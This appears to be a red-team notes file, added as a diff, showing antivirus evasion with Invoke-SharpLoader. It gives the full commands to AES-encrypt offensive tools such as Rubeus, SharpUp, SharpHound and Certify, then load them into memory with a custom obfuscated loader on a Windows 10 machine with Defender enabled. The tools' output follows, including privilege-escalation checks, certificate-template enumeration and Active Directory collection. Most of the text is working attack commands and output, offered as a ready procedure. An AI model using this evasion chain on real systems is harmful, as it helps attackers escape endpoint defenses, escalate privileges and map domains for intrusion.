@@ -1,0 +1,225 @@
+==========================================================================================================================================================
+AV bypass using the tool 'Invoke-SharpLoader'
+==========================================================================================================================================================
+
+Source => https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader
+
+Load encrypted and compressed C# Code from a remote Webserver or from a local file straight to memory and execute it there to bypass AV solutions.
+
+Two scripts are used:
+> Invoke-SharpEncrypt.ps1 is used to encrypt and compressed existing C# files.
+> Invoke-SharpLoader.ps1 is used to decrypt and load into memory the encrypted C# files.
+
+Important note: 
+> I had to obfuscate the script "Invoke-SharpLoader.ps1" beacause the version available on Github is now flaged by multiple AV solutions (e.g. Windows Defednder AV). 
+
+
+==========================================================================================================================================================
+PoC 1 - Examples with the tools Rubeus.exe, SharpUp.exe, Sharphound.exe & Certify.exe running on a Windows 10 laptop (with Defender AV enabled & up-to-date)
+==========================================================================================================================================================
+
+--------------------------------------------------------------------------------------------------------------------------
+Step 1 - Use 'Invoke-SharpEncrypt' to generate an encrypted version of the tools Rubeus.exe, SharpUp.exe and Certify.exe
+--------------------------------------------------------------------------------------------------------------------------
+
+PS C:\Users\Administrator\Documents\Tools-Pentest\Invoke-SharpLoader-master> Invoke-SharpEncrypt -file C:\Users\Administrator\Documents\Rubeus.exe 
+                                                                             -password SuperPassword2022 -outfile C:\temp\EncryptedRubeus.enc
+   ______                ____                       __
+  / __/ /  ___ _______  / __/__  __________ _____  / /_
+ _\ \/ _ \/ _ /__/ _ \/ _// _ \/ __/ __/ // / _ \/ __/
+/___/_//_/\_,_/_// .__/___/_//_/\__/_/  \_, / .__/\__/
+                /_/                    /___/_/
+
+                       Compress and AES encrypt files
+
+[*] First Read All Bytes.                                 -> Done
+[*] AES Encrypt our Bytes.                                -> Done
+[*] Now let's Compress our Bytes.                         -> Done
+[*] And finally encode our Bytes as a Base64 string.      -> Done
+
+[!] Base64 string saved as C:\temp\EncryptedRubeus.enc
+
+
+PS C:\Users\Administrator\Documents\Tools-Pentest\Invoke-SharpLoader-master> Invoke-SharpEncrypt -file C:\Users\Administrator\Documents\SharpUp.exe 
+                                                                             -password SuperPassword2022 -outfile C:\temp\EncryptedSharpUp.enc
+   ______                ____                       __
+  / __/ /  ___ _______  / __/__  __________ _____  / /_
+ _\ \/ _ \/ _ /__/ _ \/ _// _ \/ __/ __/ // / _ \/ __/
+/___/_//_/\_,_/_// .__/___/_//_/\__/_/  \_, / .__/\__/
+                /_/                    /___/_/
+
+                       Compress and AES encrypt files
+
+[*] First Read All Bytes.                                 -> Done
+[*] AES Encrypt our Bytes.                                -> Done
+[*] Now let's Compress our Bytes.                         -> Done
+[*] And finally encode our Bytes as a Base64 string.      -> Done
+
+[!] Base64 string saved as C:\temp\EncryptedSharpUp.enc
+
+
+PS C:\Users\Administrator\Documents\Tools-Pentest\Invoke-SharpLoader-master> Invoke-SharpEncrypt -file C:\Users\Administrator\Documents\Sharphound.exe 
+                                                                             -password SuperPassword2022 -outfile C:\temp\EncryptedSharphound.enc
+   ______                ____                       __
+  / __/ /  ___ _______  / __/__  __________ _____  / /_
+ _\ \/ _ \/ _ /__/ _ \/ _// _ \/ __/ __/ // / _ \/ __/
+/___/_//_/\_,_/_// .__/___/_//_/\__/_/  \_, / .__/\__/
+                /_/                    /___/_/
+
+                       Compress and AES encrypt files
+
+[*] First Read All Bytes.                                 -> Done
+[*] AES Encrypt our Bytes.                                -> Done
+[*] Now let's Compress our Bytes.                         -> Done
+[*] And finally encode our Bytes as a Base64 string.      -> Done
+
+[!] Base64 string saved as C:\temp\EncryptedSharphound.enc
+
+
+PS C:\Users\Administrator\Documents\Tools-Pentest\Invoke-SharpLoader-master> Invoke-SharpEncrypt -file C:\Users\Administrator\Documents\Certify.exe 
+                                                                             -password SuperPassword2022 -outfile C:\temp\EncryptedCertify.enc
+   ______                ____                       __
+  / __/ /  ___ _______  / __/__  __________ _____  / /_
+ _\ \/ _ \/ _ /__/ _ \/ _// _ \/ __/ __/ // / _ \/ __/
+/___/_//_/\_,_/_// .__/___/_//_/\__/_/  \_, / .__/\__/
+                /_/                    /___/_/
+
+                       Compress and AES encrypt files
+
+[*] First Read All Bytes.                                 -> Done
+[*] AES Encrypt our Bytes.                                -> Done
+[*] Now let's Compress our Bytes.                         -> Done
+[*] And finally encode our Bytes as a Base64 string.      -> Done
+
+[!] Base64 string saved as C:\temp\EncryptedCertify.enc
+
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------
+Step 2 - Download on a Windows target the encrypted tools and load them using your obfuscated version of 'Invoke-SharpLoader' without 
+         being detected nor blocked by the Microsoft Defender Antivirus 
+-------------------------------------------------------------------------------------------------------------------------------------------
+
+PS C:\temp> Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL
+
+RealTimeProtectionEnabled : True
+IoavProtectionEnabled     : True
+AntispywareEnabled        : True
+
+
+PS C:\temp> Invoke-Sharp-Loader-Custom -location C:\temp\EncryptedRubeus.enc -password SuperPassword2022 -argument currentluid
+    ______                 __                __
+   / __/ /  ___ ________  / /  ___  ___ ____/ /__ ____
+  _\ \/ _ \/ _ / __/ _ \/ /__/ _ \/ _ / _  / -_) __/
+ /___/_//_/\_,_/_/ / .__/____/\___/\_,_/\_,_/\__/_/
+                  /_/
+
+             Loads an AES Encrypted CSharp File
+                        from disk or URL
+
+Parameters missing
+NO URL, loading from disk.
+[*] One moment while getting our file from disk.... -> Done
+
+[*] Decrypting file in memory... >
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.1
+
+[*] Action: Display current LUID
+
+[*] Current LogonID (LUID) : 0xbf6a2ed (200712941)
+
+PS C:\temp>
+
+
+====================================
+
+
+PS C:\temp> Invoke-Sharp-Loader-Custom -location C:\temp\EncryptedSharpUp.enc -password SuperPassword2022 -argument audit
+
+    ______                 __                __
+   / __/ /  ___ ________  / /  ___  ___ ____/ /__ ____
+  _\ \/ _ \/ _ / __/ _ \/ /__/ _ \/ _ / _  / -_) __/
+ /___/_//_/\_,_/_/ / .__/____/\___/\_,_/\_,_/\__/_/
+                  /_/
+
+             Loads an AES Encrypted CSharp File
+                        from disk or URL
+
+Parameters missing
+NO URL, loading from disk.
+[*] One moment while getting our file from disk.... -> Done
+
+[*] Decrypting file in memory... >
+
+=== SharpUp: Running Privilege Escalation Checks ===
+[!] Modifialbe scheduled tasks were not evaluated due to permissions.
+
+=== Modifiable Folders in %PATH% ===
+        C:\Python27
+        C:\metasploit-framework\bin\
+
+[*] Completed Privesc Checks in 8 seconds
+
+
+====================================
+
+
+PS C:\temp> Invoke-Sharp-Loader-Custom -location C:\temp\EncryptedCertify.enc -password SuperPassword2022 -argument find -argument2 "/vulnerable"
+    ______                 __                __
+   / __/ /  ___ ________  / /  ___  ___ ____/ /__ ____
+  _\ \/ _ \/ _ / __/ _ \/ /__/ _ \/ _ / _  / -_) __/
+ /___/_//_/\_,_/_/ / .__/____/\___/\_,_/\_,_/\__/_/
+                  /_/
+
+             Loads an AES Encrypted CSharp File
+                        from disk or URL
+
+Parameters missing
+NO URL, loading from disk.
+[*] One moment while getting our file from disk.... -> Done
+
+[*] Decrypting file in memory... >
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.1.0
+
+[*] Action: Find certificate templates
+
+<SNIP>
+
+
+====================================
+
+
+PS C:\temp> Invoke-Sharp-Loader-Custom -location C:\temp\EncryptedSharphound.enc -password SuperPassword2022 -argument All
+    ______                 __                __
+   / __/ /  ___ ________  / /  ___  ___ ____/ /__ ____
+  _\ \/ _ \/ _ / __/ _ \/ /__/ _ \/ _ / _  / -_) __/
+ /___/_//_/\_,_/_/ / .__/____/\___/\_,_/\_,_/\__/_/
+                  /_/
+
+             Loads an AES Encrypted CSharp File
+                        from disk or URL
+
+Parameters missing
+NO URL, loading from disk.
+[*] One moment while getting our file from disk.... -> Done
+
+[*] Decrypting file in memory... >
+2022-12-23T05:01:59.6737535+01:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
+2022-12-23T05:01:59.6844959+01:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2022-12-23T05:01:59.6864500+01:00|INFORMATION|Initializing SharpHound at 05:01 on 23/12/2022
+<SNIP>
